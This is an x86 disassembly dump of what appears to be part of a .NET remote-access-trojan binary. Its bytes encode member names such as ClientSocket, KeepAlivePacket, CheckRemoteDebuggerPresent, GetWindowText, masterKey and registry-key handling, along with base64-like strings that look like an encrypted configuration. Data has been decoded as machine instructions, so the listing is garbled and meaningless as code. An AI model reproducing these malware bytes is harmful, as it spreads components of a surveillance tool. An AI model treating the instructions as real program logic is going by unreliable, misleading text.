  409195:	6c                   	insb   (%dx),%es:(%edi)
  409196:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  40919d:	6e                   	outsb  %ds:(%esi),(%dx)
  40919e:	64 6c                	fs insb (%dx),%es:(%edi)
  4091a0:	65 5f                	gs pop %edi
  4091a2:	50                   	push   %eax
  4091a3:	61                   	popa
  4091a4:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4091a7:	74 00                	je     0x4091a9
  4091a9:	4b                   	dec    %ebx
  4091aa:	65 65 70 41          	gs gs jo 0x4091ef
  4091ae:	6c                   	insb   (%dx),%es:(%edi)
  4091af:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  4091b6:	65 74 00             	gs je  0x4091b9
  4091b9:	43                   	inc    %ebx
  4091ba:	6c                   	insb   (%dx),%es:(%edi)
  4091bb:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  4091c2:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  4091c6:	53                   	push   %ebx
  4091c7:	79 73                	jns    0x40923c
  4091c9:	74 65                	je     0x409230
  4091cb:	6d                   	insl   (%dx),%es:(%edi)
  4091cc:	2e 43                	cs inc %ebx
  4091ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4091cf:	6c                   	insb   (%dx),%es:(%edi)
  4091d0:	6c                   	insb   (%dx),%es:(%edi)
  4091d1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d7:	73 2e                	jae    0x409207
  4091d9:	49                   	dec    %ecx
  4091da:	45                   	inc    %ebp
  4091db:	6e                   	outsb  %ds:(%esi),(%dx)
  4091dc:	75 6d                	jne    0x40924b
  4091de:	65 72 61             	gs jb  0x409242
  4091e1:	74 6f                	je     0x409252
  4091e3:	72 2e                	jb     0x409213
  4091e5:	52                   	push   %edx
  4091e6:	65 73 65             	gs jae 0x40924e
  4091e9:	74 00                	je     0x4091eb
  4091eb:	67 65 74 5f          	addr16 gs je 0x40924e
  4091ef:	4f                   	dec    %edi
  4091f0:	66 66 73 65          	data16 data16 jae 0x409259
  4091f4:	74 00                	je     0x4091f6
  4091f6:	73 65                	jae    0x40925d
  4091f8:	74 5f                	je     0x409259
  4091fa:	4f                   	dec    %edi
  4091fb:	66 66 73 65          	data16 data16 jae 0x409264
  4091ff:	74 00                	je     0x409201
  409201:	53                   	push   %ebx
  409202:	70 6c                	jo     0x409270
  409204:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  40920b:	6e 
  40920c:	74 4f                	je     0x40925d
  40920e:	6e                   	outsb  %ds:(%esi),(%dx)
  40920f:	45                   	inc    %ebp
  409210:	78 69                	js     0x40927b
  409212:	74 00                	je     0x409214
  409214:	53                   	push   %ebx
  409215:	61                   	popa
  409216:	6c                   	insb   (%dx),%es:(%edi)
  409217:	74 00                	je     0x409219
  409219:	49                   	dec    %ecx
  40921a:	41                   	inc    %ecx
  40921b:	73 79                	jae    0x409296
  40921d:	6e                   	outsb  %ds:(%esi),(%dx)
  40921e:	63 52 65             	arpl   %edx,0x65(%edx)
  409221:	73 75                	jae    0x409298
  409223:	6c                   	insb   (%dx),%es:(%edi)
  409224:	74 00                	je     0x409226
  409226:	54                   	push   %esp
  409227:	6f                   	outsl  %ds:(%esi),(%dx)
  409228:	55                   	push   %ebp
  409229:	70 70                	jo     0x40929b
  40922b:	65 72 49             	gs jb  0x409277
  40922e:	6e                   	outsb  %ds:(%esi),(%dx)
  40922f:	76 61                	jbe    0x409292
  409231:	72 69                	jb     0x40929c
  409233:	61                   	popa
  409234:	6e                   	outsb  %ds:(%esi),(%dx)
  409235:	74 00                	je     0x409237
  409237:	57                   	push   %edi
  409238:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  40923c:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  409243:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40924a:	65 
  40924b:	43                   	inc    %ebx
  40924c:	6c                   	insb   (%dx),%es:(%edi)
  40924d:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409254:	74 5f                	je     0x4092b5
  409256:	53                   	push   %ebx
  409257:	73 6c                	jae    0x4092c5
  409259:	43                   	inc    %ebx
  40925a:	6c                   	insb   (%dx),%es:(%edi)
  40925b:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409262:	74 5f                	je     0x4092c3
  409264:	53                   	push   %ebx
  409265:	73 6c                	jae    0x4092d3
  409267:	43                   	inc    %ebx
  409268:	6c                   	insb   (%dx),%es:(%edi)
  409269:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409270:	74 5f                	je     0x4092d1
  409272:	54                   	push   %esp
  409273:	63 70 43             	arpl   %esi,0x43(%eax)
  409276:	6c                   	insb   (%dx),%es:(%edi)
  409277:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40927e:	74 5f                	je     0x4092df
  409280:	54                   	push   %esp
  409281:	63 70 43             	arpl   %esi,0x43(%eax)
  409284:	6c                   	insb   (%dx),%es:(%edi)
  409285:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  40928c:	74 68                	je     0x4092f6
  40928e:	65 6e                	outsb  %gs:(%esi),(%dx)
  409290:	74 69                	je     0x4092fb
  409292:	63 61 74             	arpl   %esp,0x74(%ecx)
  409295:	65 41                	gs inc %ecx
  409297:	73 43                	jae    0x4092dc
  409299:	6c                   	insb   (%dx),%es:(%edi)
  40929a:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  4092a1:	73 74                	jae    0x409317
  4092a3:	65 6d                	gs insl (%dx),%es:(%edi)
  4092a5:	2e 4d                	cs dec %ebp
  4092a7:	61                   	popa
  4092a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4092a9:	61                   	popa
  4092aa:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092ad:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092af:	74 00                	je     0x4092b1
  4092b1:	45                   	inc    %ebp
  4092b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b3:	76 69                	jbe    0x40931e
  4092b5:	72 6f                	jb     0x409326
  4092b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b8:	6d                   	insl   (%dx),%es:(%edi)
  4092b9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092bb:	74 00                	je     0x4092bd
  4092bd:	70 61                	jo     0x409320
  4092bf:	72 65                	jb     0x409326
  4092c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c2:	74 00                	je     0x4092c4
  4092c4:	53                   	push   %ebx
  4092c5:	79 73                	jns    0x40933a
  4092c7:	74 65                	je     0x40932e
  4092c9:	6d                   	insl   (%dx),%es:(%edi)
  4092ca:	2e 43                	cs inc %ebx
  4092cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4092cd:	6c                   	insb   (%dx),%es:(%edi)
  4092ce:	6c                   	insb   (%dx),%es:(%edi)
  4092cf:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d5:	73 2e                	jae    0x409305
  4092d7:	49                   	dec    %ecx
  4092d8:	45                   	inc    %ebp
  4092d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4092da:	75 6d                	jne    0x409349
  4092dc:	65 72 61             	gs jb  0x409340
  4092df:	74 6f                	je     0x409350
  4092e1:	72 2e                	jb     0x409311
  4092e3:	43                   	inc    %ebx
  4092e4:	75 72                	jne    0x409358
  4092e6:	72 65                	jb     0x40934d
  4092e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e9:	74 00                	je     0x4092eb
  4092eb:	53                   	push   %ebx
  4092ec:	79 73                	jns    0x409361
  4092ee:	74 65                	je     0x409355
  4092f0:	6d                   	insl   (%dx),%es:(%edi)
  4092f1:	2e 43                	cs inc %ebx
  4092f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4092f4:	6c                   	insb   (%dx),%es:(%edi)
  4092f5:	6c                   	insb   (%dx),%es:(%edi)
  4092f6:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4092fc:	73 2e                	jae    0x40932c
  4092fe:	49                   	dec    %ecx
  4092ff:	45                   	inc    %ebp
  409300:	6e                   	outsb  %ds:(%esi),(%dx)
  409301:	75 6d                	jne    0x409370
  409303:	65 72 61             	gs jb  0x409367
  409306:	74 6f                	je     0x409377
  409308:	72 2e                	jb     0x409338
  40930a:	67 65 74 5f          	addr16 gs je 0x40936d
  40930e:	43                   	inc    %ebx
  40930f:	75 72                	jne    0x409383
  409311:	72 65                	jb     0x409378
  409313:	6e                   	outsb  %ds:(%esi),(%dx)
  409314:	74 00                	je     0x409316
  409316:	47                   	inc    %edi
  409317:	65 74 43             	gs je  0x40935d
  40931a:	75 72                	jne    0x40938e
  40931c:	72 65                	jb     0x409383
  40931e:	6e                   	outsb  %ds:(%esi),(%dx)
  40931f:	74 00                	je     0x409321
  409321:	43                   	inc    %ebx
  409322:	68 65 63 6b 52       	push   $0x526b6365
  409327:	65 6d                	gs insl (%dx),%es:(%edi)
  409329:	6f                   	outsl  %ds:(%esi),(%dx)
  40932a:	74 65                	je     0x409391
  40932c:	44                   	inc    %esp
  40932d:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409331:	67 65 72 50          	addr16 gs jb 0x409385
  409335:	72 65                	jb     0x40939c
  409337:	73 65                	jae    0x40939e
  409339:	6e                   	outsb  %ds:(%esi),(%dx)
  40933a:	74 00                	je     0x40933c
  40933c:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  409343:	67 65 72 50          	addr16 gs jb 0x409397
  409347:	72 65                	jb     0x4093ae
  409349:	73 65                	jae    0x4093b0
  40934b:	6e                   	outsb  %ds:(%esi),(%dx)
  40934c:	74 00                	je     0x40934e
  40934e:	67 65 74 5f          	addr16 gs je 0x4093b1
  409352:	52                   	push   %edx
  409353:	65 6d                	gs insl (%dx),%es:(%edi)
  409355:	6f                   	outsl  %ds:(%esi),(%dx)
  409356:	74 65                	je     0x4093bd
  409358:	45                   	inc    %ebp
  409359:	6e                   	outsb  %ds:(%esi),(%dx)
  40935a:	64 50                	fs push %eax
  40935c:	6f                   	outsl  %ds:(%esi),(%dx)
  40935d:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409364:	5f                   	pop    %edi
  409365:	43                   	inc    %ebx
  409366:	6f                   	outsl  %ds:(%esi),(%dx)
  409367:	75 6e                	jne    0x4093d7
  409369:	74 00                	je     0x40936b
  40936b:	67 65 74 5f          	addr16 gs je 0x4093ce
  40936f:	50                   	push   %eax
  409370:	72 6f                	jb     0x4093e1
  409372:	63 65 73             	arpl   %esp,0x73(%ebp)
  409375:	73 6f                	jae    0x4093e6
  409377:	72 43                	jb     0x4093bc
  409379:	6f                   	outsl  %ds:(%esi),(%dx)
  40937a:	75 6e                	jne    0x4093ea
  40937c:	74 00                	je     0x40937e
  40937e:	63 6f 75             	arpl   %ebp,0x75(%edi)
  409381:	6e                   	outsb  %ds:(%esi),(%dx)
  409382:	74 00                	je     0x409384
  409384:	47                   	inc    %edi
  409385:	65 74 50             	gs je  0x4093d8
  409388:	61                   	popa
  409389:	74 68                	je     0x4093f3
  40938b:	52                   	push   %edx
  40938c:	6f                   	outsl  %ds:(%esi),(%dx)
  40938d:	6f                   	outsl  %ds:(%esi),(%dx)
  40938e:	74 00                	je     0x409390
  409390:	44                   	inc    %esp
  409391:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  409395:	70 74                	jo     0x40940b
  409397:	00 45 6e             	add    %al,0x6e(%ebp)
  40939a:	63 72 79             	arpl   %esi,0x79(%edx)
  40939d:	70 74                	jo     0x409413
  40939f:	00 50 61             	add    %dl,0x61(%eax)
  4093a2:	72 61                	jb     0x409405
  4093a4:	6d                   	insl   (%dx),%es:(%edi)
  4093a5:	65 74 65             	gs je  0x40940d
  4093a8:	72 69                	jb     0x409413
  4093aa:	7a 65                	jp     0x409411
  4093ac:	64 54                	fs push %esp
  4093ae:	68 72 65 61 64       	push   $0x64616572
  4093b3:	53                   	push   %ebx
  4093b4:	74 61                	je     0x409417
  4093b6:	72 74                	jb     0x40942c
  4093b8:	00 43 6f             	add    %al,0x6f(%ebx)
  4093bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4093bc:	76 65                	jbe    0x409423
  4093be:	72 74                	jb     0x409434
  4093c0:	00 46 61             	add    %al,0x61(%esi)
  4093c3:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  4093ca:	54 
  4093cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4093cc:	4c                   	dec    %esp
  4093cd:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  4093d4:	75 74                	jne    0x40944a
  4093d6:	00 53 79             	add    %dl,0x79(%ebx)
  4093d9:	73 74                	jae    0x40944f
  4093db:	65 6d                	gs insl (%dx),%es:(%edi)
  4093dd:	2e 43                	cs inc %ebx
  4093df:	6f                   	outsl  %ds:(%esi),(%dx)
  4093e0:	6c                   	insb   (%dx),%es:(%edi)
  4093e1:	6c                   	insb   (%dx),%es:(%edi)
  4093e2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4093e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4093e8:	73 2e                	jae    0x409418
  4093ea:	49                   	dec    %ecx
  4093eb:	45                   	inc    %ebp
  4093ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ed:	75 6d                	jne    0x40945c
  4093ef:	65 72 61             	gs jb  0x409453
  4093f2:	74 6f                	je     0x409463
  4093f4:	72 2e                	jb     0x409424
  4093f6:	4d                   	dec    %ebp
  4093f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4093f8:	76 65                	jbe    0x40945f
  4093fa:	4e                   	dec    %esi
  4093fb:	65 78 74             	gs js  0x409472
  4093fe:	00 53 79             	add    %dl,0x79(%ebx)
  409401:	73 74                	jae    0x409477
  409403:	65 6d                	gs insl (%dx),%es:(%edi)
  409405:	2e 54                	cs push %esp
  409407:	65 78 74             	gs js  0x40947e
  40940a:	00 47 65             	add    %al,0x65(%edi)
  40940d:	74 57                	je     0x409466
  40940f:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409416:	78 74                	js     0x40948c
  409418:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  40941c:	74 00                	je     0x40941e
  40941e:	76 00                	jbe    0x409420
  409420:	47                   	inc    %edi
  409421:	65 74 46             	gs je  0x40946a
  409424:	6f                   	outsl  %ds:(%esi),(%dx)
  409425:	72 65                	jb     0x40948c
  409427:	67 72 6f             	addr16 jb 0x409499
  40942a:	75 6e                	jne    0x40949a
  40942c:	64 57                	fs push %edi
  40942e:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409435:	65 74 5f             	gs je  0x409497
  409438:	43                   	inc    %ebx
  409439:	72 65                	jb     0x4094a0
  40943b:	61                   	popa
  40943c:	74 65                	je     0x4094a3
  40943e:	4e                   	dec    %esi
  40943f:	6f                   	outsl  %ds:(%esi),(%dx)
  409440:	57                   	push   %edi
  409441:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  409448:	6e                   	outsb  %ds:(%esi),(%dx)
  409449:	64 65 78 00          	fs gs js 0x40944d
  40944d:	43                   	inc    %ebx
  40944e:	6c                   	insb   (%dx),%es:(%edi)
  40944f:	6f                   	outsl  %ds:(%esi),(%dx)
  409450:	73 65                	jae    0x4094b7
  409452:	4d                   	dec    %ebp
  409453:	75 74                	jne    0x4094c9
  409455:	65 78 00             	gs js  0x409458
  409458:	43                   	inc    %ebx
  409459:	72 65                	jb     0x4094c0
  40945b:	61                   	popa
  40945c:	74 65                	je     0x4094c3
  40945e:	4d                   	dec    %ebp
  40945f:	75 74                	jne    0x4094d5
  409461:	65 78 00             	gs js  0x409464
  409464:	44                   	inc    %esp
  409465:	65 6c                	gs insb (%dx),%es:(%edi)
  409467:	61                   	popa
  409468:	79 00                	jns    0x40946a
  40946a:	57                   	push   %edi
  40946b:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  409472:	61                   	popa
  409473:	79 00                	jns    0x409475
  409475:	49                   	dec    %ecx
  409476:	6e                   	outsb  %ds:(%esi),(%dx)
  409477:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40947e:	65 
  40947f:	41                   	inc    %ecx
  409480:	72 72                	jb     0x4094f4
  409482:	61                   	popa
  409483:	79 00                	jns    0x409485
  409485:	4d                   	dec    %ebp
  409486:	73 67                	jae    0x4094ef
  409488:	50                   	push   %eax
  409489:	61                   	popa
  40948a:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  40948d:	72 72                	jb     0x409501
  40948f:	61                   	popa
  409490:	79 00                	jns    0x409492
  409492:	54                   	push   %esp
  409493:	6f                   	outsl  %ds:(%esi),(%dx)
  409494:	41                   	inc    %ecx
  409495:	72 72                	jb     0x409509
  409497:	61                   	popa
  409498:	79 00                	jns    0x40949a
  40949a:	67 65 74 5f          	addr16 gs je 0x4094fd
  40949e:	41                   	inc    %ecx
  40949f:	73 41                	jae    0x4094e2
  4094a1:	72 72                	jb     0x409515
  4094a3:	61                   	popa
  4094a4:	79 00                	jns    0x4094a6
  4094a6:	72 65                	jb     0x40950d
  4094a8:	66 41                	inc    %cx
  4094aa:	73 41                	jae    0x4094ed
  4094ac:	72 72                	jb     0x409520
  4094ae:	61                   	popa
  4094af:	79 00                	jns    0x4094b1
  4094b1:	67 65 74 5f          	addr16 gs je 0x409514
  4094b5:	4b                   	dec    %ebx
  4094b6:	65 79 00             	gs jns 0x4094b9
  4094b9:	73 65                	jae    0x409520
  4094bb:	74 5f                	je     0x40951c
  4094bd:	4b                   	dec    %ebx
  4094be:	65 79 00             	gs jns 0x4094c1
  4094c1:	43                   	inc    %ebx
  4094c2:	72 65                	jb     0x409529
  4094c4:	61                   	popa
  4094c5:	74 65                	je     0x40952c
  4094c7:	53                   	push   %ebx
  4094c8:	75 62                	jne    0x40952c
  4094ca:	4b                   	dec    %ebx
  4094cb:	65 79 00             	gs jns 0x4094ce
  4094ce:	44                   	inc    %esp
  4094cf:	65 6c                	gs insb (%dx),%es:(%edi)
  4094d1:	65 74 65             	gs je  0x409539
  4094d4:	53                   	push   %ebx
  4094d5:	75 62                	jne    0x409539
  4094d7:	4b                   	dec    %ebx
  4094d8:	65 79 00             	gs jns 0x4094db
  4094db:	4f                   	dec    %edi
  4094dc:	70 65                	jo     0x409543
  4094de:	6e                   	outsb  %ds:(%esi),(%dx)
  4094df:	53                   	push   %ebx
  4094e0:	75 62                	jne    0x409544
  4094e2:	4b                   	dec    %ebx
  4094e3:	65 79 00             	gs jns 0x4094e6
  4094e6:	67 65 74 5f          	addr16 gs je 0x409549
  4094ea:	50                   	push   %eax
  4094eb:	75 62                	jne    0x40954f
  4094ed:	6c                   	insb   (%dx),%es:(%edi)
  4094ee:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  4094f5:	61                   	popa
  4094f6:	75 74                	jne    0x40956c
  4094f8:	68 4b 65 79 00       	push   $0x79654b
  4094fd:	6d                   	insl   (%dx),%es:(%edi)
  4094fe:	61                   	popa
  4094ff:	73 74                	jae    0x409575
  409501:	65 72 4b             	gs jb  0x40954f
  409504:	65 79 00             	gs jns 0x409507
  409507:	52                   	push   %edx
  409508:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40950f:	4b 65 
  409511:	79 00                	jns    0x409513
  409513:	5f                   	pop    %edi
  409514:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  409518:	53                   	push   %ebx
  409519:	79 73                	jns    0x40958e
  40951b:	74 65                	je     0x409582
  40951d:	6d                   	insl   (%dx),%es:(%edi)
  40951e:	2e 53                	cs push %ebx
  409520:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409524:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40952b:	70 
  40952c:	74 6f                	je     0x40959d
  40952e:	67 72 61             	addr16 jb 0x409592
  409531:	70 68                	jo     0x40959b
  409533:	79 00                	jns    0x409535
  409535:	41                   	inc    %ecx
  409536:	73 73                	jae    0x4095ab
  409538:	65 6d                	gs insl (%dx),%es:(%edi)
  40953a:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40953e:	41                   	inc    %ecx
  40953f:	64 64 72 65          	fs fs jb 0x4095a8
  409543:	73 73                	jae    0x4095b8
  409545:	46                   	inc    %esi
  409546:	61                   	popa
  409547:	6d                   	insl   (%dx),%es:(%edi)
  409548:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  40954f:	63 
  409550:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409554:	79 00                	jns    0x409556
  409556:	57                   	push   %edi
  409557:	72 69                	jb     0x4095c2
  409559:	74 65                	je     0x4095c0
  40955b:	42                   	inc    %edx
  40955c:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  409563:	6f                   	outsl  %ds:(%esi),(%dx)
  409564:	42                   	inc    %edx
  409565:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  40956c:	65 74 5f             	gs je  0x4095ce
  40956f:	53                   	push   %ebx
  409570:	79 73                	jns    0x4095e5
  409572:	74 65                	je     0x4095d9
  409574:	6d                   	insl   (%dx),%es:(%edi)
  409575:	44                   	inc    %esp
  409576:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40957d:	79 00                	jns    0x40957f
  40957f:	53                   	push   %ebx
  409580:	65 74 52             	gs je  0x4095d5
  409583:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  40958a:	00 6f 
  40958c:	70 5f                	jo     0x4095ed
  40958e:	45                   	inc    %ebp
  40958f:	71 75                	jno    0x409606
  409591:	61                   	popa
  409592:	6c                   	insb   (%dx),%es:(%edi)
  409593:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  40959a:	49 
  40959b:	6e                   	outsb  %ds:(%esi),(%dx)
  40959c:	65 71 75             	gs jno 0x409614
  40959f:	61                   	popa
  4095a0:	6c                   	insb   (%dx),%es:(%edi)
  4095a1:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4095a8:	74 
  4095a9:	65 6d                	gs insl (%dx),%es:(%edi)
  4095ab:	2e 4e                	cs dec %esi
  4095ad:	65 74 2e             	gs je  0x4095de
  4095b0:	53                   	push   %ebx
  4095b1:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4095b5:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4095bc:	64 
  4095bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4095be:	77 73                	ja     0x409633
  4095c0:	49                   	dec    %ecx
  4095c1:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4095c4:	74 69                	je     0x40962f
  4095c6:	74 79                	je     0x409641
  4095c8:	00 49 73             	add    %cl,0x73(%ecx)
  4095cb:	4e                   	dec    %esi
  4095cc:	75 6c                	jne    0x40963a
  4095ce:	6c                   	insb   (%dx),%es:(%edi)
  4095cf:	4f                   	dec    %edi
  4095d0:	72 45                	jb     0x409617
  4095d2:	6d                   	insl   (%dx),%es:(%edi)
  4095d3:	70 74                	jo     0x409649
  4095d5:	79 00                	jns    0x4095d7
  4095d7:	00 00                	add    %al,(%eax)
  4095d9:	0d 53 00 48 00       	or     $0x480053,%eax
  4095de:	41                   	inc    %ecx
  4095df:	00 32                	add    %dh,(%edx)
  4095e1:	00 35 00 36 00 00    	add    %dh,0x3600
  4095e7:	80 d9 50             	sbb    $0x50,%cl
  4095ea:	00 71 00             	add    %dh,0x0(%ecx)
  4095ed:	59                   	pop    %ecx
  4095ee:	00 78 00             	add    %bh,0x0(%eax)
  4095f1:	62 00                	bound  %eax,(%eax)
  4095f3:	51                   	push   %ecx
  4095f4:	00 45 00             	add    %al,0x0(%ebp)
  4095f7:	76 00                	jbe    0x4095f9
  4095f9:	71 00                	jno    0x4095fb
  4095fb:	57                   	push   %edi
  4095fc:	00 30                	add    %dh,(%eax)
  4095fe:	00 34 00             	add    %dh,(%eax,%eax,1)
  409601:	58                   	pop    %eax
  409602:	00 72 00             	add    %dh,0x0(%edx)
  409605:	33 00                	xor    (%eax),%eax
  409607:	30 00                	xor    %al,(%eax)
  409609:	47                   	inc    %edi
  40960a:	00 67 00             	add    %ah,0x0(%edi)
  40960d:	4d                   	dec    %ebp
  40960e:	00 79 00             	add    %bh,0x0(%ecx)
  409611:	4e                   	dec    %esi
  409612:	00 32                	add    %dh,(%edx)
  409614:	00 36                	add    %dh,(%esi)
  409616:	00 5a 00             	add    %bl,0x0(%edx)
  409619:	74 00                	je     0x40961b
  40961b:	64 00 32             	add    %dh,%fs:(%edx)
  40961e:	00 70 00             	add    %dh,0x0(%eax)
  409621:	42                   	inc    %edx
  409622:	00 45 00             	add    %al,0x0(%ebp)
  409625:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  409629:	6f                   	outsl  %ds:(%esi),(%dx)
  40962a:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  40962e:	00 61 00             	add    %ah,0x0(%ecx)
  409631:	53                   	push   %ebx
  409632:	00 6d 00             	add    %ch,0x0(%ebp)
  409635:	38 00                	cmp    %al,(%eax)
  409637:	71 00                	jno    0x409639
  409639:	46                   	inc    %esi
  40963a:	00 45 00             	add    %al,0x0(%ebp)
  40963d:	70 00                	jo     0x40963f
  40963f:	2f                   	das
  409640:	00 50 00             	add    %dl,0x0(%eax)
  409643:	54                   	push   %esp
  409644:	00 50 00             	add    %dl,0x0(%eax)
  409647:	63 00                	arpl   %eax,(%eax)
  409649:	4b                   	dec    %ebx
  40964a:	00 50 00             	add    %dl,0x0(%eax)
  40964d:	78 00                	js     0x40964f
  40964f:	59                   	pop    %ecx
  409650:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
  409654:	00 5a 00             	add    %bl,0x0(%edx)
  409657:	4a                   	dec    %edx
  409658:	00 66 00             	add    %ah,0x0(%esi)
  40965b:	43                   	inc    %ebx
  40965c:	00 6c 00 46          	add    %ch,0x46(%eax,%eax,1)
  409660:	00 33                	add    %dh,(%ebx)
  409662:	00 7a 00             	add    %bh,0x0(%edx)
  409665:	64 00 5a 00          	add    %bl,%fs:0x0(%edx)
  409669:	39 00                	cmp    %eax,(%eax)
  40966b:	71 00                	jno    0x40966d
  40966d:	63 00                	arpl   %eax,(%eax)
  40966f:	61                   	popa
  409670:	00 46 00             	add    %al,0x0(%esi)
  409673:	34 00                	xor    $0x0,%al
  409675:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  409679:	4a                   	dec    %edx
  40967a:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  40967e:	00 2b                	add    %ch,(%ebx)
  409680:	00 77 00             	add    %dh,0x0(%edi)
  409683:	47                   	inc    %edi
  409684:	00 77 00             	add    %dh,0x0(%edi)
  409687:	77 00                	ja     0x409689
  409689:	72 00                	jb     0x40968b
  40968b:	71 00                	jno    0x40968d
  40968d:	52                   	push   %edx
  40968e:	00 57 00             	add    %dl,0x0(%edi)
  409691:	44                   	inc    %esp
  409692:	00 69 00             	add    %ch,0x0(%ecx)
  409695:	59                   	pop    %ecx
  409696:	00 72 00             	add    %dh,0x0(%edx)
  409699:	70 00                	jo     0x40969b
  40969b:	41                   	inc    %ecx
  40969c:	00 4f 00             	add    %cl,0x0(%edi)
  40969f:	69 00 59 00 4b 00    	imul   $0x4b0059,(%eax),%eax
  4096a5:	41                   	inc    %ecx
  4096a6:	00 70 00             	add    %dh,0x0(%eax)
  4096a9:	33 00                	xor    (%eax),%eax
  4096ab:	35 00 56 00 4e       	xor    $0x4e005600,%eax
  4096b0:	00 67 00             	add    %ah,0x0(%edi)
  4096b3:	34 00                	xor    $0x0,%al
  4096b5:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  4096b9:	35 00 73 00 55       	xor    $0x55007300,%eax
  4096be:	00 3d 00 00 81 31    	add    %bh,0x31810000
  4096c4:	61                   	popa
  4096c5:	00 77 00             	add    %dh,0x0(%edi)
  4096c8:	48                   	dec    %eax
  4096c9:	00 6f 00             	add    %ch,0x0(%edi)
  4096cc:	4f                   	dec    %edi
  4096cd:	00 46 00             	add    %al,0x0(%esi)
  4096d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4096d1:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
  4096d5:	00 46 00             	add    %al,0x0(%esi)
  4096d8:	47                   	inc    %edi
  4096d9:	00 51 00             	add    %dl,0x0(%ecx)
  4096dc:	6b 00 75             	imul   $0x75,(%eax),%eax
  4096df:	00 36                	add    %dh,(%esi)
  4096e1:	00 6a 00             	add    %ch,0x0(%edx)
